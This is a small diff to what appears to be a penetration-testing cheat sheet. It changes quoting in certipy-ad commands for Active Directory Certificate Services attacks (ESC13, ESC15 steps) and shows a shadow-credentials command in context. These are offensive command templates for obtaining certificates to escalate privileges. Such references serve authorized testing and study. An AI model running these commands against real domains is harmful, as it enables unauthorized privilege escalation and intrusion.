@@ -89,13 +89,13 @@ certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <targeted-use
 
 ## certipy-ad - ESC13
 ```
-certipy-ad req -u "<USER>@<DOMAIN>" -p "<PASSWORD>" -dc-ip "<DC_IP>" -target "<ADCS_HOST>" -ca '<ca_name>' -template '<template>'
+certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -target '<ADCS_HOST>' -ca '<ca_name>' -template '<template>'
 ```
 
 ## certipy-ad - ESC15 step 1
-Request a certificate with "Certificate Request Agent" application policy
+Request a certificate with 'Certificate Request Agent' application policy
 ```
-certipy-ad req -u <USER>@<DOMAIN> --application-policies "1.3.6.1.4.1.311.20.2.1" -ca <ca_name> -template <template> -dc-ip <DC_IP>
+certipy-ad req -u <USER>@<DOMAIN> --application-policies '1.3.6.1.4.1.311.20.2.1' -ca <ca_name> -template <template> -dc-ip <DC_IP>
 ```
 
 ## certipy-ad - ESC15 step 2
